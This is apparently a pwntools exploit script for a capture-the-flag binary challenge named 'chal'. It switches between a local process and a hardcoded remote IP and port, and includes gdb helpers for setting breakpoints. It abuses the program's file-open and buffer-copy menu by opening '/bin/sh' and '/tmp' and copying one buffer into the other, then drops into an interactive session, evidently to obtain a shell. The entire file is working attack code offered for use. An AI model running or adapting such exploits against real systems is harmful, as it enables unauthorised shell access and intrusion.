from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chal'
HOST = '172.17.0.2'
PORT =  5000
HOST = '35.236.188.145'
PORT =   8190

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def open_file(name):
    r.sendlineafter(b'mand: ', b'1')
    r.sendlineafter(b'name: ', name)
def copy_buf(src, dst):
    r.sendlineafter(b'mand: ', b'2')
    r.sendlineafter(b'dex: ', str(src).encode())
    r.sendlineafter(b'dex: ', str(dst).encode())

r = start()
if args.D:
    debug(r, [0x166e])

open_file(b'/bin/sh')
open_file(b'/tmp')
copy_buf(0, 1)

r.interactive()
r.close()

